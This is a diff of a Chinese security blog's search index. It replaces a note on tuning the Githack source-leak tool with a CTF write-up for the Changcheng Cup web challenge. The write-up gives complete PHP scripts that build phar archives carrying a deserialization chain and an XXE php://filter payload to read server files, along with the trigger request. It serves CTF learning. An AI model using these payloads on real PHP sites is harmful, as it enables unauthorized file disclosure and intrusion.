-    <url>/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>Githack有个好坑的地方<br />刚开始的时候总是下载不到泄露的<code>php文件</code><br />要扫很多次才有可能下载到,可是要是是真实环境,扫了两遍没有可能就真的觉得没有了,那如何解决呢？<br />于是我进了源码看一下<br /><img src="/images/1/1-1.png"><br />点击进入githack.py并编辑<br /><img src="/images/1/1-2.png"><br />把他线程改低一点就可以了,流量不够大就可以不被拒绝访问<br />就可以下载到源码</p>
+    <title>长城杯Web WP</title>
+    <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span>
+<p>访问8000端口，题目给了源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">通过链子构造phar文件，上传phar文件后用phar协议读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>反序列化的链子很简单：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">TheUse$__destruct() -->MyClass$__invoke-->MyClass$getdir()  //读取文件名称
+TheUse$__destruct() -->MyClass$__invoke-->MyClass$load()     //读取文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>构造反序列化链子：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;
+$payload = new TheUse(new MyClass('./'), 'load', $xml);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$xml=&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EOF</span>
+<span class="token attr-name">&lt;?xml</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token attr-name">?</span><span class="token punctuation">></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这种形式定义，不能直接放到构造函数里，我就是死在这</p>
+<h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p>
+<p>不用绝对路径的报错图：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png"></p>
+<p>解决方法(使用绝对路径)：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png"></p>
+<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+ <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+
+
+<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getdir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span>
+<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行后上传phar文件<br>然后使用phar协议读取：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png"></p>
+<p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
+         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+ <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
+     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>
+ <span class="token punctuation">&#125;</span>
+
+
+<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
+EOF;
+$payload = new TheUse(new MyClass('/var/www/html'), 'load', $xml);
+$phar = new Phar('phar.phar');
+$phar->startBuffering();
+$phar->setStub('GIF89a'.'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>');
+$phar->setMetadata($payload);
+$phar->addFromString('1.txt','test'); // phar:[phar.phar][system_get_you_filename]/1.txt
+$phar->stopBuffering();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p>
+<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png"></p>
+<p>解码得到flag:<br><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png"></p>
+<p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>Tools</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MD5碰撞</title>
+    <url>/2022/08/23/MD5%E7%A2%B0%E6%92%9E/</url>
+    <content><![CDATA[<p><a name="lCJgX"></a></p>
